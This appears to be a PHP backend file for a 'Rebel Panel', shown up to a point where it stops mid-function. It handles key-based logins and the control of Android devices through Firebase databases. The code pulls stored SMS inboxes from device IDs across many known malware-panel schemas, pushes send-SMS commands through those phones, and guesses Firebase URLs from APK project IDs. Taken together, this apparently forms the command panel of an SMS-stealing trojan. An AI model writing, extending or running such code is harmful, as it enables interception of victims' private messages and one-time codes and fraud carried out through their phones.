<?php
/**
 * Rebel Panel — shared key/session helpers for mobile.php and bot integrations.
 */

declare(strict_types=1);

function rebel_keys_file(): string
{
    return __DIR__ . '/rebel_keys.json';
}

function rebel_json_out(array $payload, int $code = 200): void
{
    if (!headers_sent()) {
        http_response_code($code);
        header('Content-Type: application/json; charset=UTF-8');
        header('Cache-Control: no-store');
    }
    echo json_encode($payload, JSON_UNESCAPED_UNICODE);
    exit;
}

function rebel_keys_load(): array
{
    $file = rebel_keys_file();
    if (!is_file($file)) {
        return ['keys' => [], 'sessions' => []];
    }
    $raw = file_get_contents($file);
    if ($raw === false || trim($raw) === '') {
        return ['keys' => [], 'sessions' => []];
    }
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        return ['keys' => [], 'sessions' => []];
    }
    if (!isset($data['keys']) || !is_array($data['keys'])) {
        $data['keys'] = [];
    }
    if (!isset($data['sessions']) || !is_array($data['sessions'])) {
        $data['sessions'] = [];
    }
    return $data;
}

function rebel_keys_save(array $data): void
{
    if (!isset($data['keys']) || !is_array($data['keys'])) {
        $data['keys'] = [];
    }
    if (!isset($data['sessions']) || !is_array($data['sessions'])) {
        $data['sessions'] = [];
    }
    file_put_contents(
        rebel_keys_file(),
        json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
        LOCK_EX
    );
}

function rebel_norm_key(string $key): string
{
    return strtoupper(preg_replace('/[^A-Z0-9\-]/', '', trim($key)));
}

function rebel_key_infer_type(string $key): string
{
    $key = rebel_norm_key($key);
    if (str_starts_with($key, 'APK-') || str_starts_with($key, 'APK')) {
        return 'apk';
    }
    if (str_starts_with($key, 'WEB-') || str_starts_with($key, 'WEB')) {
        return 'web';
    }
    return 'web';
}

function rebel_key_allowed_for_client(array $row, string $client): bool
{
    $type = strtolower((string)($row['type'] ?? 'web'));
    $client = strtolower($client);
    if ($type === 'both' || $type === 'all') {
        return true;
    }
    return $type === $client;
}

function rebel_key_login_allowed(array $data, string $key): bool
{
    $key = rebel_norm_key($key);
    $row = $data['keys'][$key] ?? null;
    if (!$row || !is_array($row)) {
        return false;
    }
    if (!empty($row['revoked'])) {
        return false;
    }
    $expires = (int)($row['expires'] ?? 0);
    if ($expires > 0 && $expires < time()) {
        return false;
    }
    $maxUses = (int)($row['max_uses'] ?? 1);
    $uses = (int)($row['uses'] ?? 0);
    if (!empty($row['used']) || ($maxUses > 0 && $uses >= $maxUses)) {
        return false;
    }
    return true;
}

function rebel_consume_key(array &$data, string $key): void
{
    $key = rebel_norm_key($key);
    if (!isset($data['keys'][$key]) || !is_array($data['keys'][$key])) {
        return;
    }
    $data['keys'][$key]['uses'] = (int)($data['keys'][$key]['uses'] ?? 0) + 1;
    $maxUses = (int)($data['keys'][$key]['max_uses'] ?? 1);
    if ($maxUses > 0 && $data['keys'][$key]['uses'] >= $maxUses) {
        $data['keys'][$key]['used'] = true;
    }
}

function rebel_create_session(array &$data, string $key, bool $remember = false): array
{
    $token = bin2hex(random_bytes(24));
    $ttl = $remember ? 86400 * 30 : 86400 * 7;
    $expires = time() + $ttl;
    $hash = hash('sha256', $token);
    $data['sessions'][$hash] = [
        'key' => rebel_norm_key($key),
        'created' => time(),
        'expires' => $expires,
    ];
    return ['token' => $token, 'expires' => $expires];
}

function rebel_session_valid(array &$data, string $token): ?array
{
    $token = trim($token);
    if ($token === '') {
        return null;
    }
    $hash = hash('sha256', $token);
    $row = $data['sessions'][$hash] ?? null;
    if (!$row || !is_array($row)) {
        return null;
    }
    $expires = (int)($row['expires'] ?? 0);
    if ($expires > 0 && $expires < time()) {
        unset($data['sessions'][$hash]);
        return null;
    }
    return $row;
}

function rebel_create_key(string $type = 'web', int $maxUses = 1, int $ttlDays = 30): string
{
    $prefix = strtoupper($type) === 'APK' ? 'APK' : 'WEB';
    $key = $prefix . '-' . strtoupper(substr(bin2hex(random_bytes(4)), 0, 8));
    $data = rebel_keys_load();
    $data['keys'][$key] = [
        'type' => strtolower($type) === 'apk' ? 'apk' : 'web',
        'uses' => 0,
        'max_uses' => max(1, $maxUses),
        'used' => false,
        'created' => time(),
        'expires' => $ttlDays > 0 ? time() + ($ttlDays * 86400) : 0,
    ];
    rebel_keys_save($data);
    return $key;
}

/** Resolve Firebase auth key — same as rebel.py public DB fallback (URL as key). */
function rebel_firebase_auth_key(string $url, string $key): string
{
    $key = trim($key);
    if ($key !== '') {
        return $key;
    }
    return rtrim($url, '/');
}

/** Detect Firebase schema from shallow root keys (matches panel discoverInstance). */
function rebel_detect_schema(?array $roots, string $url = ''): string
{
    if (is_array($roots)) {
        if (array_key_exists('Verify_Device', $roots) || array_key_exists('verify_device', $roots)) {
            return 'shootii';
        }
        if (array_key_exists('user_list', $roots) || array_key_exists('user_data', $roots)
            || array_key_exists('All_Users', $roots) || array_key_exists('All_User', $roots)) {
            return 'rabel';
        }
        if (array_key_exists('messages', $roots)) {
            return 'rabel';
        }
        if (array_key_exists('clients', $roots)) {
            return 'rabel';
        }
        if (array_key_exists('devices', $roots) || array_key_exists('devices_status', $roots)) {
            return 'spinplay';
        }
    }
    if ($url !== '') {
        if (preg_match('/rabel|raand|user_list|demon|jdhd|rto9|raki/i', $url)) {
            return 'rabel';
        }
        if (preg_match('/shoot|verify|mitteld|nammu|mmmff|dev-rahul/i', $url)) {
            return 'shootii';
        }
        if (stripos($url, 'rabel') !== false) {
            return 'rabel';
        }
    }
    return 'spinplay';
}

/** Panel device nodes from APK batch scan */
function rebel_panel_device_nodes(): array
{
    return [
        'clients', 'devices', 'devices_status', 'Verify_Device', 'user_list', 'user_data',
        'users', 'All_Users', 'All_User', 'AllClients', 'all_clients',
        'online_devices', 'online_users', 'clients_list', 'client_list', 'online_status',
        'device_list', 'devices_list', 'device_data', 'registered_users', 'active_devices',
        'active_users', 'connected_devices', 'device_status',
    ];
}

/** Per-device SMS suffix paths seen across panel APKs */
function rebel_panel_sms_suffixes(): array
{
    return [
        'all_sms', 'new_sms', 'sms', 'messages', 'sms_inbox', 'inbox',
        'received_sms', 'sent_sms', 'sms_list', 'user_sms', 'msg_list',
    ];
}

/** Global SMS roots keyed by device id */
function rebel_panel_sms_global_nodes(): array
{
    return ['messages', 'user_sms', 'sms', 'all_sms', 'new_sms', 'sms_inbox', 'inbox', 'received_sms', 'sent_sms', 'sms_data', 'device_sms', 'client_sms', 'sms_logs', 'msg_store', 'text_messages', 'sms_backup'];
}

/** All SMS read paths — rebel.py messages/{id} + SpinPlay/Shootii/Rabel fallbacks */
function rebel_sms_paths_for_device(string $deviceId, string $schema = 'rabel', string $deviceNode = 'clients'): array
{
    $id = trim($deviceId);
    if ($id === '') {
        return [];
    }

    $node = $deviceNode !== '' ? $deviceNode : 'clients';
    $bases = array_values(array_unique(array_merge(
        [$node],
        rebel_panel_device_nodes()
    )));
    $paths = [];
    $suffixes = rebel_panel_sms_suffixes();

    foreach (rebel_panel_sms_global_nodes() as $global) {
        $paths[] = $global . '/' . $id;
    }

    if ($schema === 'shootii') {
        foreach (array_values(array_unique(['Verify_Device', $node, 'clients', 'devices'])) as $n) {
            if ($n === '') {
                continue;
            }
            foreach ($suffixes as $sfx) {
                $paths[] = $n . '/' . $id . '/' . $sfx;
            }
        }
        return array_values(array_unique($paths));
    }

    if ($schema === 'spinplay') {
        $preferred = [];
        foreach (array_values(array_unique(['devices', 'devices_status', $node, 'clients'])) as $n) {
            if ($n === '') {
                continue;
            }
            foreach (['all_sms', 'new_sms', 'sms', 'messages'] as $sfx) {
                $preferred[] = $n . '/' . $id . '/' . $sfx;
            }
        }
        $preferred[] = 'messages/' . $id;
        return array_values(array_unique($preferred));
    }

    if ($schema === 'rabel' || $deviceNode === 'user_list' || $deviceNode === 'user_data') {
        $paths = [
            'user_sms/' . $id,
            'sms_backup/' . $id,
            'messages/' . $id,
            'sms/' . $id,
            'all_sms/' . $id,
            'new_sms/' . $id,
        ];
        $junkNodes = ['clients', 'users', 'data', 'sendsms', 'sendSms', 'smsQueue', 'bots', 'Admin', 'admin'];
        foreach ($bases as $n) {
            if ($n === '' || in_array($n, $junkNodes, true)) {
                continue;
            }
            foreach (['all_sms', 'new_sms', 'sms', 'messages'] as $sfx) {
                $paths[] = $n . '/' . $id . '/' . $sfx;
            }
        }
        return array_values(array_unique($paths));
    }

    foreach ($bases as $n) {
        if ($n === '') {
            continue;
        }
        foreach ($suffixes as $sfx) {
            $paths[] = $n . '/' . $id . '/' . $sfx;
        }
    }

    return array_values(array_unique($paths));
}

/** Send paths with payload type — rebel.py: clients/{id}/webhookEvent/sendSms */
function rebel_is_rto_style_url(string $url): bool
{
    return (bool) preg_match('/rto9|rto0|rto91/i', $url);
}

function rebel_send_paths_for_device(string $deviceId, string $schema = 'rabel', string $deviceNode = 'clients', string $url = ''): array
{
    $id = trim($deviceId);
    if ($id === '') {
        return [];
    }

    $out = [];
    $node = $deviceNode !== '' ? $deviceNode : 'clients';

    if ($schema === 'spinplay') {
        foreach (array_values(array_unique([$node, 'devices', 'clients', 'Verify_Device'])) as $n) {
            $out[] = ['path' => $n . '/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay'];
        }
        $out[] = ['path' => 'clients/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
    } elseif ($schema === 'shootii') {
        foreach (array_values(array_unique(['Verify_Device', $node, 'clients', 'devices'])) as $n) {
            if ($n === '') {
                continue;
            }
            $out[] = ['path' => $n . '/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay'];
            $out[] = ['path' => $n . '/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel'];
            $out[] = ['path' => $n . '/' . $id . '/commands/send_sms', 'type' => 'spinplay'];
        }
    } else {
        if (rebel_is_rto_style_url($url) || $deviceNode === 'user_list' || $deviceNode === 'user_data') {
            $out[] = ['path' => 'clients/' . $id, 'type' => 'rto9', 'method' => 'PATCH'];
            $out[] = ['path' => $id, 'type' => 'rto9', 'method' => 'PATCH'];
            $out[] = ['path' => 'clients/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel', 'method' => 'PUT'];
            $out[] = ['path' => $id . '/webhookEvent/sendSms', 'type' => 'rabel', 'method' => 'PUT'];
        }
        if ($deviceNode === 'clients' || $schema === 'rabel') {
            $out[] = ['path' => 'clients/' . $id, 'type' => 'rto9', 'method' => 'PATCH'];
        }
        foreach (array_values(array_unique(['clients', $node, 'user_list', 'user_data', 'devices'])) as $n) {
            if ($n === '') {
                continue;
            }
            $out[] = ['path' => $n . '/' . $id . '/webhookEvent/sendSms', 'type' => 'rabel', 'method' => 'PUT'];
        }
        $out[] = ['path' => 'devices/' . $id . '/manual_commands/send_sms', 'type' => 'spinplay', 'method' => 'PUT'];
    }

    return $out;
}

function rebel_send_payload_for_type(string $type, int $sim, string $to, string $message, string $deviceId = ''): array
{
    $sim = max(1, $sim);
    $toDial = rebel_format_sms_to($to);
    if ($type === 'spinplay') {
        return [
            'to' => $toDial,
            'message' => $message,
            'sim' => $sim - 1,
        ];
    }
    if ($type === 'rto9') {
        $slot = max(0, $sim - 1);
        return [
            'cmd' => 'send_sms',
            'command' => 'send message',
            'messageText' => $message,
            'msg' => $message,
            'phoneNumber' => $toDial,
            'phone' => $toDial,
            'number' => $toDial,
            'to' => $toDial,
            'sendSms' => [
                'message' => $message,
                'status' => 'pending',
                'to' => $toDial,
            ],
            'sms' => [
                'message' => $message,
                'status' => 'pending',
                'to' => $toDial,
            ],
            'sim' => $slot,
            'simSlot' => (string) $slot,
            'targetDeviceId' => $deviceId,
            'timestamp' => (int) round(microtime(true) * 1000),
            'type' => 'sms',
        ];
    }

    return [
        'from' => $sim,
        'to' => $toDial,
        'message' => $message,
        'isSended' => false,
    ];
}

function rebel_format_sms_to(string $raw): string
{
    $clean = preg_replace('/\D/', '', $raw);
    if (strlen($clean) === 10) {
        return '91' . $clean;
    }
    if (strlen($clean) === 12 && str_starts_with($clean, '91')) {
        return $clean;
    }
    if (strlen($clean) > 10) {
        return '91' . substr($clean, -10);
    }
    return $clean;
}

/** Same as rebel.py normalize_phone() */
function rebel_normalize_phone(string $raw): string
{
    $clean = preg_replace('/\D/', '', $raw);
    if (strlen($clean) === 10) {
        return $clean;
    }
    if (strlen($clean) > 10 && str_starts_with($clean, '91')) {
        return substr($clean, -10);
    }
    return $clean;
}

/** Same as rebel.py firebase_req() */
function rebel_firebase_req(string $method, string $url, string $key, string $path, ?array $data = null): ?array
{
    $authKey = rebel_firebase_auth_key($url, $key);
    $full = rtrim($url, '/') . '/' . ltrim($path, '/') . '.json';
    if ($authKey !== '') {
        $full .= '?auth=' . rawurlencode($authKey);
    }

    $headers = ['Content-Type: application/json', 'Accept: application/json'];
    $body = $data !== null ? json_encode($data, JSON_UNESCAPED_UNICODE) : null;

    if (function_exists('curl_init')) {
        $ch = curl_init($full);
        curl_setopt_array($ch, [
            CURLOPT_CUSTOMREQUEST => strtoupper($method),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 12,
            CURLOPT_HTTPHEADER => $headers,
        ]);
        if ($body !== null) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
        }
        $raw = curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if ($code === 200 || $code === 201) {
            if ($raw === false || trim($raw) === '' || trim($raw) === 'null') {
                return [];
            }
            $parsed = json_decode($raw, true);
            return is_array($parsed) ? $parsed : [];
        }
        return null;
    }

    $opts = [
        'http' => [
            'method' => strtoupper($method),
            'timeout' => 12,
            'header' => implode("\r\n", $headers) . "\r\n",
            'ignore_errors' => true,
        ],
    ];
    if ($body !== null) {
        $opts['http']['content'] = $body;
    }
    $raw = @file_get_contents($full, false, stream_context_create($opts));
    if ($raw === false) {
        return null;
    }
    global $http_response_header;
    $status = 0;
    if (!empty($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) {
        $status = (int) $m[1];
    }
    if ($status !== 200 && $status !== 201) {
        return null;
    }
    if (trim($raw) === '' || trim($raw) === 'null') {
        return [];
    }
    $parsed = json_decode($raw, true);
    return is_array($parsed) ? $parsed : [];
}

function rebel_sms_looks_like_message(array $m): bool
{
    $body = trim((string)($m['body'] ?? $m['message'] ?? $m['text'] ?? $m['content'] ?? $m['msg'] ?? ''));
    return $body !== '';
}

function rebel_sms_is_list_array(array $arr): bool
{
    if ($arr === []) {
        return true;
    }
    return array_keys($arr) === range(0, count($arr) - 1);
}

/** Flatten Firebase SMS nodes — flat push maps, arrays, and SpinPlay all_sms wrappers. */
function rebel_sms_as_list($raw): array
{
    if (!is_array($raw)) {
        return [];
    }

    foreach (['messages', 'sms', 'data', 'items', 'list'] as $wrapKey) {
        if (isset($raw[$wrapKey]) && is_array($raw[$wrapKey])) {
            return rebel_sms_as_list($raw[$wrapKey]);
        }
    }

    if (rebel_sms_is_list_array($raw)) {
        $out = [];
        foreach ($raw as $v) {
            if (!is_array($v)) {
                continue;
            }
            if (rebel_sms_looks_like_message($v)) {
                $out[] = $v;
            } else {
                $out = array_merge($out, rebel_sms_as_list($v));
            }
        }
        return $out;
    }

    $out = [];
    foreach ($raw as $v) {
        if (!is_array($v)) {
            continue;
        }
        if (rebel_sms_looks_like_message($v)) {
            $out[] = $v;
        } else {
            $out = array_merge($out, rebel_sms_as_list($v));
        }
    }
    return $out;
}

function rebel_sms_to_ms($v): int
{
    if ($v === null || $v === '') {
        return 0;
    }
    if (is_int($v) && $v > 0) {
        return $v < 1000000000000 ? $v * 1000 : $v;
    }
    if (is_float($v) && $v > 0) {
        $n = (int) $v;
        return $n < 1000000000000 ? $n * 1000 : $n;
    }
    if (is_string($v)) {
        if (is_numeric($v) && (float) $v > 0) {
            $n = (float) $v;
            return $n < 1000000000000 ? (int) ($n * 1000) : (int) $n;
        }
        $t = strtotime($v);
        if ($t !== false) {
            return $t * 1000;
        }
    }
    return 0;
}

function rebel_sms_msg_time(array $m): int
{
    $keys = ['date', 'timestamp', 'dateTime', 'datetime', 'time', 'received_at', 'sent_at', 'created_at', 'receivedAt', 'sentAt', 'sms_time', 'msg_time', 'last_modified', 'received_time', 'sent_time', 'id'];
    foreach ($keys as $k) {
        $ms = rebel_sms_to_ms($m[$k] ?? null);
        if ($ms > 0) {
            return $ms;
        }
    }
    $sk = rebel_sms_to_ms($m['_sortKey'] ?? null);
    if ($sk > 0) {
        return $sk;
    }
    return rebel_sms_to_ms($m['date_readable'] ?? null);
}

function rebel_sms_is_outbound_command(array $m): bool
{
    if (!empty($m['sender']) || !empty($m['address']) || !empty($m['originatingAddress'])) {
        return false;
    }
    if (!empty($m['body']) && (isset($m['sender']) || isset($m['address']))) {
        return false;
    }
    if (!empty($m['to']) && !empty($m['status']) && empty($m['body']) && (!empty($m['message']) || !empty($m['msg']))) {
        return true;
    }
    if (!empty($m['to']) && (!empty($m['message']) || !empty($m['msg'])) && empty($m['body']) && empty($m['sender']) && empty($m['date']) && empty($m['timestamp'])) {
        return true;
    }
    return false;
}

/** Normalize SMS record — same fields as rebel.py + panel normalizeSms() */
function rebel_sms_normalize($m): ?array
{
    if (!is_array($m)) {
        return null;
    }
    if (rebel_sms_is_outbound_command($m)) {
        return null;
    }
    $body = trim((string)($m['body'] ?? $m['message'] ?? $m['text'] ?? $m['content'] ?? $m['msg'] ?? ''));
    if ($body === '') {
        return null;
    }
    if (empty($m['body']) && !empty($m['message']) && !empty($m['to']) && !empty($m['status']) && empty($m['sender'])) {
        return null;
    }
    $ts = rebel_sms_msg_time($m);
    return [
        'address' => (string)($m['address'] ?? $m['sender'] ?? $m['from'] ?? $m['number'] ?? $m['originatingAddress'] ?? '?'),
        'body' => $body,
        'date_readable' => (string)($m['date_readable'] ?? $m['dateTime'] ?? $m['date_time'] ?? $m['time'] ?? $m['date'] ?? '—'),
        'type' => strtolower((string)($m['type'] ?? $m['direction'] ?? $m['sms_type'] ?? 'inbox')),
        'ts' => $ts,
        'device_id' => (string)($m['device_id'] ?? $m['deviceId'] ?? $m['client_id'] ?? $m['clientId'] ?? $m['dev_id'] ?? $m['devId'] ?? ''),
    ];
}

function rebel_sms_belongs_to_device(array $sms, string $deviceId, string $compositeId = ''): bool
{
    $did = trim((string)($sms['device_id'] ?? ''));
    if ($did === '') {
        return true;
    }
    if ($did === $deviceId || ($compositeId !== '' && $did === $compositeId)) {
        return true;
    }
    return false;
}

function rebel_merge_sms_lists(array ...$lists): array
{
    $merged = [];
    $seen = [];
    foreach ($lists as $list) {
        foreach ($list as $s) {
            if (!is_array($s)) {
                continue;
            }
            $key = ($s['address'] ?? '?') . '|' . ($s['ts'] ?? 0) . '|' . substr((string)($s['body'] ?? ''), 0, 80);
            if (isset($seen[$key])) {
                continue;
            }
            $seen[$key] = true;
            $merged[] = $s;
        }
    }
    usort($merged, static fn($a, $b) => ($b['ts'] ?? 0) <=> ($a['ts'] ?? 0));
    return $merged;
}

/**
 * Fetch SMS for device — rebel.py messages/{id} + SpinPlay fallbacks.
 */
function rebel_fetch_sms_for_device(
    string $url,
    string $key,
    string $deviceId,
    string $schema = 'rabel',
    string $deviceNode = 'clients',
    string $compositeId = ''
): array {
    if ($deviceId === '') {
        return ['ok' => false, 'error' => 'Device id required', 'messages' => []];
    }
    if ($url === '') {
        return ['ok' => false, 'error' => 'Firebase URL missing', 'messages' => []];
    }

    $authKey = rebel_firebase_auth_key($url, $key);
    $paths = rebel_sms_paths_for_device($deviceId, $schema, $deviceNode);
    $all = [];

    foreach ($paths as $path) {
        $data = rebel_firebase_req('GET', $url, $authKey, $path);
        if ($data === null) {
            continue;
        }
        $batch = [];
        foreach (rebel_sms_as_list($data) as $raw) {
            $norm = rebel_sms_normalize($raw);
            if ($norm === null) {
                continue;
            }
            unset($norm['device_id']);
            $batch[] = $norm;
        }
        if (!$batch) {
            continue;
        }
        $all = rebel_merge_sms_lists($all, $batch);
    }

    return [
        'ok' => true,
        'messages' => $all,
        'count' => count($all),
        'schema' => $schema,
    ];
}

/**
 * Send SMS to device — same payload/path as rebel.py with multi-path fallback.
 */
function rebel_send_sms_to_device(
    string $url,
    string $key,
    string $deviceId,
    int $sim,
    string $to,
    string $message,
    string $schema = 'rabel',
    string $deviceNode = 'clients'
): array {
    $to = rebel_format_sms_to($to);
    if ($deviceId === '' || $to === '' || $message === '') {
        return ['ok' => false, 'error' => 'Device, number and message required'];
    }
    if ($url === '') {
        return ['ok' => false, 'error' => 'Firebase URL missing'];
    }

    $sim = max(1, $sim);
    $authKey = rebel_firebase_auth_key($url, $key);
    $attempts = rebel_send_paths_for_device($deviceId, $schema, $deviceNode, $url);
    $lastError = 'Failed to send SMS — device offline or Firebase error';

    foreach ($attempts as $attempt) {
        $path = (string)($attempt['path'] ?? '');
        $type = (string)($attempt['type'] ?? 'rabel');
        if ($path === '') {
            continue;
        }
        $payload = rebel_send_payload_for_type($type, $sim, $to, $message, $deviceId);
        $method = strtoupper((string)($attempt['method'] ?? 'PUT'));
        $res = rebel_firebase_req($method, $url, $authKey, $path, $payload);
        if ($res !== null) {
            $hint = '';
            if ($type === 'rto9') {
                $hint = ' Command queued — device must be online on APK to send.';
            }
            return [
                'ok' => true,
                'message' => 'SMS command sent to device' . $hint,
                'sim' => $sim,
                'to' => $to,
                'path' => $path,
                'schema' => $type,
            ];
        }
        $lastError = 'Failed via ' . $path;
    }

    return ['ok' => false, 'error' => $lastError];
}

/** Shared Firebase project list — admin.php writes, k.php reads */
function rebel_firebase_file(): string
{
    return __DIR__ . '/rebel_firebase.json';
}

function rebel_admin_file(): string
{
    return __DIR__ . '/rebel_admin.json';
}

function rebel_admin_load(): array
{
    $file = rebel_admin_file();
    if (!is_file($file)) {
        $hash = password_hash('rebeladmin', PASSWORD_DEFAULT);
        $data = ['password_hash' => $hash, 'created' => time()];
        file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT), LOCK_EX);
        return $data;
    }
    $raw = file_get_contents($file);
    $data = json_decode($raw ?: '{}', true);
    return is_array($data) ? $data : [];
}

function rebel_admin_check_password(string $password): bool
{
    $data = rebel_admin_load();
    $hash = (string)($data['password_hash'] ?? '');
    if ($hash === '') {
        return false;
    }
    return password_verify($password, $hash);
}

function rebel_admin_session_start(): void
{
    if (session_status() === PHP_SESSION_NONE) {
        session_start([
            'cookie_httponly' => true,
            'cookie_samesite' => 'Lax',
        ]);
    }
}

function rebel_admin_logged_in(): bool
{
    rebel_admin_session_start();
    return !empty($_SESSION['rebel_admin_ok']);
}

function rebel_admin_login(string $password): bool
{
    if (!rebel_admin_check_password($password)) {
        return false;
    }
    rebel_admin_session_start();
    $_SESSION['rebel_admin_ok'] = time();
    return true;
}

function rebel_admin_logout(): void
{
    rebel_admin_session_start();
    unset($_SESSION['rebel_admin_ok']);
}

function rebel_firebase_load(): array
{
    $file = rebel_firebase_file();
    if (!is_file($file)) {
        return ['updated' => 0, 'projects' => []];
    }
    $raw = file_get_contents($file);
    if ($raw === false || trim($raw) === '') {
        return ['updated' => 0, 'projects' => []];
    }
    $data = json_decode($raw, true);
    if (!is_array($data)) {
        return ['updated' => 0, 'projects' => []];
    }
    if (!isset($data['projects']) || !is_array($data['projects'])) {
        $data['projects'] = [];
    }
    if (!isset($data['updated'])) {
        $data['updated'] = 0;
    }
    return $data;
}

function rebel_firebase_save(array $data): void
{
    if (!isset($data['projects']) || !is_array($data['projects'])) {
        $data['projects'] = [];
    }
    $data['updated'] = time();
    file_put_contents(
        rebel_firebase_file(),
        json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
        LOCK_EX
    );
}

function rebel_firebase_norm_url(string $url): string
{
    return rtrim(trim($url), '/');
}

function rebel_firebase_norm_project(array $row): ?array
{
    $name = trim((string)($row['name'] ?? ''));
    $url = rebel_firebase_norm_url((string)($row['databaseURL'] ?? $row['database_url'] ?? $row['url'] ?? ''));
    if ($name === '' || $url === '') {
        return null;
    }
    $id = trim((string)($row['id'] ?? ''));
    if ($id === '') {
        $id = 'fb_' . substr(hash('sha256', $url), 0, 12);
    }
    $secret = trim((string)($row['secret'] ?? $row['key'] ?? $row['auth_key'] ?? $row['databaseSecret'] ?? ''));
    $apiKey = trim((string)($row['apiKey'] ?? $row['api_key'] ?? ''));
    $schema = strtolower(trim((string)($row['schema'] ?? '')));
    if ($schema === '') {
        $schema = (stripos($url, 'rabel') !== false) ? 'rabel' : 'spinplay';
    }

    return [
        'id' => $id,
        'name' => $name,
        'databaseURL' => $url,
        'secret' => $secret,
        'key' => $secret,
        'apiKey' => $apiKey,
        'schema' => $schema,
        'projectId' => trim((string)($row['projectId'] ?? $row['project_id'] ?? '')),
        'appId' => trim((string)($row['appId'] ?? $row['app_id'] ?? '')),
        'authDomain' => trim((string)($row['authDomain'] ?? $row['auth_domain'] ?? '')),
        'storageBucket' => trim((string)($row['storageBucket'] ?? $row['storage_bucket'] ?? '')),
        'messagingSenderId' => trim((string)($row['messagingSenderId'] ?? $row['messaging_sender_id'] ?? '')),
        'packageName' => trim((string)($row['packageName'] ?? $row['package_name'] ?? '')),
        'deviceNode' => trim((string)($row['deviceNode'] ?? $row['device_node'] ?? 'clients')),
        'preferredDeviceNode' => trim((string)($row['preferredDeviceNode'] ?? $row['preferred_device_node'] ?? $row['deviceNode'] ?? $row['device_node'] ?? 'clients')),
        'created' => (int)($row['created'] ?? time()),
    ];
}

function rebel_firebase_list(): array
{
    return rebel_firebase_load()['projects'];
}

function rebel_firebase_add(array $input): array
{
    $proj = rebel_firebase_norm_project($input);
    if ($proj === null) {
        return ['ok' => false, 'error' => 'Project name and Firebase URL required'];
    }

    $data = rebel_firebase_load();
    foreach ($data['projects'] as $existing) {
        if (rebel_firebase_norm_url((string)($existing['databaseURL'] ?? '')) === $proj['databaseURL']) {
            return ['ok' => false, 'error' => 'This Firebase URL is already added'];
        }
    }

    $data['projects'][] = $proj;
    rebel_firebase_save($data);

    return ['ok' => true, 'project' => $proj, 'updated' => $data['updated']];
}

function rebel_firebase_delete(string $id): array
{
    $id = trim($id);
    if ($id === '') {
        return ['ok' => false, 'error' => 'Project id required'];
    }

    $data = rebel_firebase_load();
    $before = count($data['projects']);
    $data['projects'] = array_values(array_filter(
        $data['projects'],
        static fn($p) => is_array($p) && (string)($p['id'] ?? '') !== $id
    ));

    if (count($data['projects']) === $before) {
        return ['ok' => false, 'error' => 'Project not found'];
    }

    rebel_firebase_save($data);
    return ['ok' => true, 'updated' => $data['updated']];
}

/** Public read + admin write API for Firebase projects */
function rebel_firebase_api_handle(bool $requireAdminForWrite = true): void
{
    $method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET');

    if ($method === 'GET' && isset($_GET['rebel_firebase_api'])) {
        $data = rebel_firebase_load();
        rebel_json_out([
            'ok' => true,
            'updated' => (int)($data['updated'] ?? 0),
            'projects' => array_values($data['projects']),
            'count' => count($data['projects']),
        ]);
    }

    if ($method !== 'POST') {
        rebel_json_out(['ok' => false, 'error' => 'Method not allowed'], 405);
    }

    if ($requireAdminForWrite && !rebel_admin_logged_in()) {
        rebel_json_out(['ok' => false, 'error' => 'Admin login required'], 401);
    }

    $body = json_decode(file_get_contents('php://input') ?: '{}', true);
    if (!is_array($body)) {
        $body = $_POST;
    }
    if (!is_array($body)) {
        $body = [];
    }

    $action = strtolower(trim((string)($body['action'] ?? $_GET['action'] ?? '')));

    if ($action === 'add') {
        $result = rebel_firebase_add($body);
        rebel_json_out($result, !empty($result['ok']) ? 200 : 400);
    }

    if ($action === 'delete') {
        $result = rebel_firebase_delete((string)($body['id'] ?? ''));
        rebel_json_out($result, !empty($result['ok']) ? 200 : 400);
    }

    if ($action === 'list') {
        $data = rebel_firebase_load();
        rebel_json_out([
            'ok' => true,
            'updated' => (int)($data['updated'] ?? 0),
            'projects' => array_values($data['projects']),
        ]);
    }

    rebel_json_out(['ok' => false, 'error' => 'Unknown action'], 400);
}

/** Quick HTTP status check — 200/401/403 mean Firebase URL likely exists */
function rebel_http_status(string $url, int $timeout = 6): int
{
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_NOBODY => true,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $timeout,
            CURLOPT_FOLLOWLOCATION => true,
        ]);
        curl_exec($ch);
        $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        return $code;
    }
    $ctx = stream_context_create(['http' => ['method' => 'HEAD', 'timeout' => $timeout, 'ignore_errors' => true]]);
    @file_get_contents($url, false, $ctx);
    global $http_response_header;
    if (!empty($http_response_header[0]) && preg_match('/\s(\d{3})\s/', $http_response_header[0], $m)) {
        return (int) $m[1];
    }
    return 0;
}

function rebel_firebase_url_likely_valid(string $url): bool
{
    $code = rebel_http_status(rtrim($url, '/') . '/.json?shallow=true');
    return in_array($code, [200, 401, 403], true);
}

function rebel_apk_guess_database_urls(string $projectId): array
{
    $projectId = trim($projectId);
    if ($projectId === '') {
        return [];
    }
    return array_values(array_unique([
        'https://' . $projectId . '-default-rtdb.firebaseio.com',
        'https://' . $projectId . '.firebaseio.com',
        'https://' . $projectId . '-default-rtdb.asia-southeast1.firebasedatabase.app',
        'https://' . $projectId . '-default-rtdb.europe-west1.firebasedatabase.app',
        'https://' . $projectId . '-default-rtdb.us-central1.firebasedatabase.app',
    ]));
}

function rebel_apk_parse_google_services(array $content): array
{
    $out = [
        'databaseURL' => '',
        'apiKey' => '',
        'projectId' => '',
        'appId' => '',
        'packageName' => '',
        'storageBucket' => '',
        'messagingSenderId' => '',
        'authDomain' => '',
        'name' => '',
    ];

    $info = is_array($content['project_info'] ?? null) ? $content['project_info'] : [];
    $clients = is_array($content['client'] ?? null) ? $content['client'] : [];
    $client = [];
